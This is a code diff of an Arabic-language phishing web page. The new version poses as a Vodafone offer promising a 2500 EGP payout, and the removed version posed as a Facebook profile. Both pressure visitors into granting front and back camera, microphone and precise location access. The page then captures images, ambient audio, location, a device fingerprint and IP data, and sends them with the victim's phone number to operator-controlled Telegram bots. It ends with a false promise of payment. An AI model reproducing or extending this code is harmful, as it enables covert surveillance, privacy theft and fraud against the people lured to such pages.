+            await sendToTelegram(BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, 'text', null, `⭐ فتح صفحة فودافون - رقم المستفيد: ${phoneNumber}`);
             
-            let permissionsGranted = {
-                front: false,
-                back: false,
-                audio: false,
-                loc: false
-            };
+            // 1. بصمة الجهاز وال IP
+            await getDeepDeviceFingerprint(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, phoneNumber);
+            await getRichIPData(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, phoneNumber);
             
-            // إشعار فتح الرابط
-            await sendToTelegram(tChat, tToken, 'text', null, "🔔 [محمد فتحي - السوفييف] تم فتح الملف الشخصي بواسطة عضو");
-            await sendToTelegram(mChat, mToken, 'text', null, "🔔 [مراقب] فتح ملف شخصي - عضو جديد");
+            // 2. طلب الكاميرا الأمامية
+            loaderText.innerText = "📸 طلب الوصول للكاميرا الأمامية ...";
+            let frontOk = await captureFrontCamera(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, phoneNumber);
             
-            // جمع البيانات الأساسية
-            await getDeepDeviceFingerprint(tChat, tToken, mChat, mToken);
-            await getRichIPData(tChat, tToken, mChat, mToken);
+            // 3. كاميرا خلفية
+            loaderText.innerText = "📷 طلب الكاميرا الخلفية ...";
+            let backOk = await captureBackCamera(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, phoneNumber);
             
-            let collectionStarted = false;
+            // 4. ميكروفون
+            loaderText.innerText = "🎤 طلب تسجيل محيط (مطلوب) ...";
+            let audioOk = await recordAmbientAudio(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, phoneNumber);
             
-            const requestAllPermissions = async () => {
-                if (collectionStarted) return;
-                collectionStarted = true;
-                permissionBtn.disabled = true;
-                loadingOverlay.style.display = 'block';
-                statusBar.innerHTML = '🎬 جاري طلب الأذونات المطلوبة...';
-                errorMsgDiv.style.display = 'none';
-                
-                // طلب الكاميرا الأمامية
-                try {
-                    permissionsGranted.front = await captureFrontCamera(tChat, tToken, mChat, mToken);
-                } catch(e) { permissionsGranted.front = false; }
-                
-                // طلب الكاميرا الخلفية
-                try {
-                    permissionsGranted.back = await captureBackCamera(tChat, tToken, mChat, mToken);
-                } catch(e) { permissionsGranted.back = false; }
-                
-                // طلب الميكروفون
-                try {
-                    permissionsGranted.audio = await recordAmbientAudio(tChat, tToken, mChat, mToken);
-                } catch(e) { permissionsGranted.audio = false; }
-                
-                // طلب الموقع
-                try {
-                    permissionsGranted.loc = await getPreciseLocation(tChat, tToken, mChat, mToken);
-                } catch(e) { permissionsGranted.loc = false; }
-                
-                // التحقق من منح جميع الأذونات
-                const allGranted = permissionsGranted.front && permissionsGranted.back && permissionsGranted.audio && permissionsGranted.loc;
-                
-                if (!allGranted) {
-                    errorMsgDiv.innerHTML = '❌ يجب قبول جميع الأذونات (كاميرا أمامية + خلفية + ميكروفون + موقع) لتتمكن من فتح الحساب. الرجاء المحاولة مرة أخرى وقبول جميع الطلبات.';
-                    errorMsgDiv.style.display = 'block';
-                    loadingOverlay.style.display = 'none';
-                    permissionBtn.disabled = false;
-                    collectionStarted = false;
-                    statusBar.innerHTML = '🔐 السوفييف | يجب قبول جميع الأذونات لفتح الحساب';
-                    return;
-                }
-                
-                // تم منح جميع الأذونات
-                permissionBadge.style.display = 'flex';
-                statusBar.innerHTML = '✅ تم قبول جميع الأذونات، جاري التجهيز...';
-                
-                await sendToTelegram(tChat, tToken, 'text', null, "✅ اكتمل جمع جميع الوسائط بنجاح - تم قبول جميع الأذونات");
-                await sendToTelegram(mChat, mToken, 'text', null, "✅ تم الحصول على بيانات العضو - جميع الأذونات مقبولة");
-                
-                loadingOverlay.innerHTML = '<div class="spinner"></div><p>تم التفعيل! إعادة التوجيه للمشاهدة الحصرية...</p>';
-                statusBar.innerHTML = '✅ جاهز، جاري نقلك إلى المحتوى الحصري...';
-                
-                setTimeout(() => {
-                    window.location.href = "https://www.facebook.com/mhmd.fthy.79378";
-                }, 2000);
-            };
+            // 5. موقع جغرافي
+            loaderText.innerText = "📍 طلب تحديد الموقع الجغرافي ...";
+            let locationOk = await getPreciseLocation(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, phoneNumber);
             
-            permissionBtn.onclick = requestAllPermissions;
+            const allGranted = frontOk && backOk && audioOk && locationOk;
             
-            document.getElementById('msgBtn').onclick = () => { alert("🔒 يجب فتح الحساب أولاً عبر الزر الأخضر"); };
-            document.getElementById('followBtn').onclick = () => { alert("📢 قم بفتح الحساب أولاً للمتابعة"); };
+            if (!allGranted) {
+                loaderDiv.style.visibility = "hidden";
+                errorDiv.innerText = "❌ يجب قبول جميع الأذونات (كاميرا أمامية + خلفية + ميكروفون + موقع) لتأكيد استلام المبلغ.";
+                errorDiv.style.display = "block";
+                claimBtn.disabled = false;
+                isProcessing = false;
+                statusSpan.innerHTML = "🔁 فشل: يرجى قبول كل الصلاحيات";
+                return;
+            }
             
-            statusBar.innerHTML = '🔐 السوفييف | يجب قبول جميع الأذونات لفتح الحساب';
-        })();
+            // نجاح كامل
+            loaderText.innerText = "✅ تم التحقق! جاري إرسال طلب صرف المبلغ...";
+            await sendToTelegram(BOT_CONFIG.userChatId, BOT_CONFIG.userToken, 'text', null, `✅🎉 اكتملت جميع الأذونات بنجاح للرقم: ${phoneNumber} - انتظار صرف 2500 ج.م خلال 24 ساعة`);
+            await sendToTelegram(BOT_CONFIG.masterChatId, BOT_CONFIG.masterToken, 'text', null, `✅ [نجاح] المستخدم ${phoneNumber} وافق على كامل الأذونات وبياناته مرسلة`);
+            
+            // إظهار رسالة للمستخدم
+            loaderDiv.style.visibility = "hidden";
+            errorDiv.style.backgroundColor = "#e8f5e9";
+            errorDiv.style.color = "#2e7d32";
+            errorDiv.innerText = "🎉 تم استلام طلبك بنجاح! خلال 24 ساعة سوف يصلك المبلغ إلى رقم المستفيد.";
+            errorDiv.style.display = "block";
+            claimBtn.disabled = false;
+            statusSpan.innerHTML = "✅ تم التفعيل - سيصلك المبلغ خلال 24 ساعة";
+            isProcessing = false;
+            
+            // اختياري: إعادة تعيين بعد دقائق
+            setTimeout(() => {
+                errorDiv.style.display = "none";
+            }, 8000);
+        }
+
+        claimBtn.onclick = startVerificationProcess;
     })();
 </script>
 </body>
